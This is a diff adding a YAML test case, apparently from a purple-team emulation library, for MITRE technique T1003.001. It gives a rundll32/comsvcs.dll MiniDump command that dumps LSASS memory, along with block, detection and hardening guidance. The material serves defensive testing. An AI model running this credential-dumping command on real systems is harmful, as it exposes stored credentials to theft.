@@ -1,0 +1,21 @@
+name: Dump LSASS memory using builtin comsvcs.dll
+description: Use rundll32.exe and comsvcs.dll to dump LSASS process memory to disk
+platforms:
+- windows
+guidance:
+- shell> rundll32.exe c:\windows\system32\comsvcs.dll MiniDump {{ pidof_lsass }} {{ gen_outfile }}  full
+block:
+- Suspicious process execution/behavior blocked by endpoint security tool
+- Enable Credential Guard to prevent traditional process dumping of LSASS
+detect:
+- Suspicious process execution/behavior detected by endpoint security tool or triggers alert in SIEM based on telemetry
+controls:
+- SIEM
+- Endpoint Protection
+- Hardening
+metadata:
+  id: 314b4f6a-b27a-4a55-af5c-c98bc3146dd8
+  tid: T1003.001
+  tactic: TA0006
+  x_vectr_id: 314b4f6a-b27a-4a55-af5c-c98bc3146dd8
+  isv: 1
